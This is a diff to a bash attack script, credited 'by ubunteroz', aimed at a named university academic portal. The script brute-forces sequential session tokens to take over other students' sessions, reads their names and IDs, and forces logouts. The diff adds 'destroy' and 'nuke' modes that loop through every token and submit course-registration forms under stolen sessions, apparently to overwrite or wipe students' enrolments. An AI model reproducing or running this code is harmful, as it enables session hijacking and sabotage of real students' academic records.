@@ -4,17 +4,37 @@
 URL="https://academics.feb.ugm.ac.id"
 UA="Mozilla/5.0 (PLAYSTATION 3; 3.55)"
 
+cat <<EOF
+ ___  ___  ___  _    _    ___  ___  _  ___  ___  ___
+/ __|| | ||   \| |_ | |_ | _ |/ __|| ||__ \| _ |/ __|
+|__ ||__ || | || __||   || __||__ || || __|| __|| |
+|___/|___/|_|_|\___/|_|_|\___||___/|_|\___|\___||_|
+                   by ubunteroz
+
+EOF
+
+echo "Base URL  : $URL"
+echo "User Agent: $UA"
+echo ""
+
 public_token()
 {
-	curl -A "$UA" -L --silent -D - $URL/index.php | grep id_pengunjung | sed -e 's/\(.*\)=//'
+	echo "Getting public token..."
+	out=$(curl -A "$UA" -L --silent -D - $URL/index.php | grep id_pengunjung | sed -e 's/\(.*\)=//')
+	if [ "$out" == "" ]; then
+		echo "=> got empty response"
+	else
+		echo "=> current public token: $out"
+	fi
 }
 
 public_scan()
 {
 	TOKEN=$1
 	token_check $TOKEN
+	echo "Scanning for active token, starts from $TOKEN"
 	while true; do
-		echo -n "$TOKEN: "
+		echo -n "[$TOKEN] "
 		user_name $TOKEN
 		TOKEN=$(expr $TOKEN + 1)
 	done
@@ -24,6 +44,7 @@ user_view()
 {
 	TOKEN=$1
 	token_check $TOKEN
+	echo "[$TOKEN] Getting user details..."
 	local fullname_string=$(user_name $TOKEN)
 	local fullname=$(echo $fullname_string | sed 's/ (\(.*\)//')
 	local userid=$(echo $fullname_string | sed -e 's/\(.*\) (//' -e 's/)//')
@@ -43,11 +64,18 @@ token_check()
 	exit 1
 	fi
 }
+
 user_logout()
 {
 	TOKEN=$1
 	token_check $TOKEN
+	echo "[$TOKEN] Forcing user logout..."
 	curl -A "$UA" --silent -b "id_pengunjung=$TOKEN;AG1=0000%7C0000" $URL/index.php?logout=1
+	if [ "$?" == "0" ]; then
+		echo "=> logged out successfully"
+	else
+		echo "=> curl returned exit code $? instead of 0"
+	fi
 }
 
 user_name()
@@ -60,6 +88,46 @@ user_name()
 	sed -e "s/\(.*\)<td align='center'><b>//" -e "s/<br>/ (/" -e "s/<\/b><\/td>/)/")
 
 	if [ "$out" == "" ]; then echo "null"; else echo $out; fi
+}
+
+nuke_krs()
+{
+	TOKEN=$1
+	token_check $TOKEN
+	echo "[DANGEROUS] Starting nuclear war..."
+	while true; do
+	echo "[$TOKEN] Getting user details..."
+	local fullname_string=$(user_name $TOKEN)
+	local userid=$(echo $fullname_string | sed -e 's/\(.*\) (//' -e 's/)//')
+	if [ "$userid" == "null" ]; then
+		echo "=> not found"
+	else
+		echo "=> found $userid"
+		echo "[$TOKEN] Sending form data..."
+		out=$(curl -A "$UA" --silent -b "id_pengunjung=$TOKEN;AG1=10%7C1000;MS=1000|19" \
+		"$URL/index.php?MS=1000|19" --form hlm=1 --form niu="$userid" --form sesi="2013|2" --form blokmk="1" --form bypass_sks="" --form tmb="Record_KRS")
+		if [ "$out" == "" ]; then echo "=> got empty response"; else echo "=> sent and got a reply"; fi
+	fi
+	TOKEN=$(expr $TOKEN + 1)
+	done
+}
+
+user_destroy_krs()
+{
+	TOKEN=$1
+	token_check $TOKEN
+	echo "[$TOKEN] Getting user details..."
+	local fullname_string=$(user_name $TOKEN)
+	local userid=$(echo $fullname_string | sed -e 's/\(.*\) (//' -e 's/)//')
+	if [ "$userid" == "null" ]; then
+		echo "=> token is inactive"
+	else
+		echo "=> user: $fullname_string"
+		echo "[$TOKEN] Sending form data..."
+		out=$(curl -A "$UA" --silent -b "id_pengunjung=$TOKEN;AG1=10%7C1000;MS=1000|19" \
+		"$URL/index.php?MS=1000|19" --form hlm=1 --form niu="$userid" --form sesi="2013|2" --form blokmk="1" --form bypass_sks="" --form tmb="Record_KRS")
+		if [ "$out" == "" ]; then echo "=> got empty response"; else echo "=> sent and got a reply"; fi
+	fi
 }
 
 user_wifi()
@@ -89,6 +157,12 @@ case "$1" in
 		;;
 	vi | view )
 		user_view $2
+		;;
+	de | destroy )
+		user_destroy_krs $2
+		;;
+	nu | nuke )
+		nuke_krs $2
 		;;
 	* )
 		echo "Invalid command: $1"
